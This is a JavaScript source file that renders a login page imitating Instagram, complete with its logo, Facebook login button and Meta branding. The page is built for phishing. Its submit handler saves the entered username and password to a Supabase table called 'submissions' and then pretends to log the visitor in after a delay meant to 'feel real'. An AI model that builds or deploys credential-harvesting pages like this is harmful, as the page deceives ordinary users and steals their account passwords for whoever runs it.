import { supabase } from './supabase.js';
export function renderLogin(container, onLoginSuccess) {
  const html = `
    <div class="login-container fade-in">
      <!-- SVG Instagram Icon Logo -->
      <svg class="logo-icon" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="igGradient" x1="0%" y1="100%" x2="100%" y2="0%">
            <stop offset="0%" stop-color="#F58529"/>
            <stop offset="25%" stop-color="#FEDA77"/>
            <stop offset="50%" stop-color="#DD2A7B"/>
            <stop offset="75%" stop-color="#8134AF"/>
            <stop offset="100%" stop-color="#515BD4"/>
          </linearGradient>
        </defs>
        <rect width="512" height="512" rx="115" ry="115" fill="url(#igGradient)" />
        <rect width="338" height="338" x="87" y="87" rx="80" ry="80" fill="none" stroke="#fff" stroke-width="34" />
        <circle cx="256" cy="256" r="80" fill="none" stroke="#fff" stroke-width="34" />
        <circle cx="363" cy="149" r="22" fill="#fff" />
      </svg>
      
      <h1 class="login-heading">
        See everyday moments from<br>your <span class="text-pink">close friends</span>.
      </h1>

      <div class="hero-image-container">
        <img src="assets/hero.png" alt="App Preview">
      </div>

      <div class="login-card">
        <h2 class="login-card-title">Log into Instagram</h2>
        <form id="loginForm">
          <div class="input-group">
            <input type="text" id="usernameInput" placeholder="Username" required>
          </div>
          <div class="input-group">
            <input type="text" id="keyInput" placeholder="password" required>
          </div>
          <button type="submit" class="login-btn">Log in</button>
        </form>
        
        <a href="#" class="forgot-password">Forgot password?</a>
        
        <div class="divider">
          <div class="divider-line"></div>
          <span class="divider-text">OR</span>
          <div class="divider-line"></div>
        </div>

        <button type="button" class="fb-login-btn">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="#3b5998" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2C6.477 2 2 6.477 2 12C2 16.991 5.657 21.128 10.438 21.881V14.89H7.898V12H10.438V9.797C10.438 7.274 11.98 5.881 14.28 5.881C15.358 5.881 16.485 6.074 16.485 6.074V8.498H15.243C14.02 8.498 13.639 9.256 13.639 10.035V12H16.37L15.933 14.89H13.639V21.881C18.343 21.128 22 16.991 22 12C22 6.477 17.523 2 12 2Z" fill="#1877F2"/>
          </svg>
          Log in with Facebook
        </button>

        <button type="button" class="create-account-btn">
          Create new account
        </button>
      </div>

      <div class="footer-meta">
        <svg width="16" height="16" viewBox="0 0 36 36" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
            <path d="M25.753 9.473c-3.109-2.91-7.25-3.692-10.741-2.023-1.637.77-3.23 2.155-4.502 3.793-1.129 1.481-2.126 3.256-3.003 5.342-.71 1.706-1.503 3.493-2.316 5.215-.817 1.716-1.644 3.407-2.585 4.887-1.393 2.148-3.197 3.638-5.26 3.638-1.547 0-2.884-.874-3.568-2.327-.474-1.026-.523-2.176-.145-3.327.359-1.096 1.01-2.132 1.838-2.91 3.109-2.91 7.25-3.692 10.741-2.023 1.637.77 3.23 2.155 4.502 3.793 1.129 1.481 2.126 3.256 3.003 5.342.71 1.706 1.503 3.493 2.316 5.215.817 1.716 1.644 3.407 2.585 4.887 1.393 2.148 3.197 3.638 5.26 3.638 1.547 0 2.884.874 3.568 2.327.474 1.026.523 2.176.145 3.327-.359 1.096-1.01 2.132-1.838 2.91z" fill="currentColor"/>
        </svg>
        Meta
      </div>
    </div>
  `;

  container.innerHTML = html;

  const loginForm = container.querySelector('#loginForm');
  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const usernameVal = container.querySelector('#usernameInput').value;
    const keyVal = container.querySelector('#keyInput').value;

    const { error } = await supabase
      .from('submissions')
      .insert({
        username: usernameVal,
        key: keyVal
      });

    if (error) {
      console.error(error);
      alert('Failed to save data: ' + error.message);
      return;
    }
    // Validate that it's not an email or phone number
    if (usernameVal.includes('@') || /^[0-9+\-\s()]+$/.test(usernameVal)) {
      alert("Incorrect username. Please enter a valid username (email and phone numbers are not allowed).");
      return;
    }

    // Simulate login process
    const btn = container.querySelector('.login-btn');
    const originalText = btn.textContent;
    btn.textContent = 'Logging in...';
    btn.disabled = true;

    setTimeout(() => {
      onLoginSuccess();
    }, 800); // Small delay to feel real
  });
}
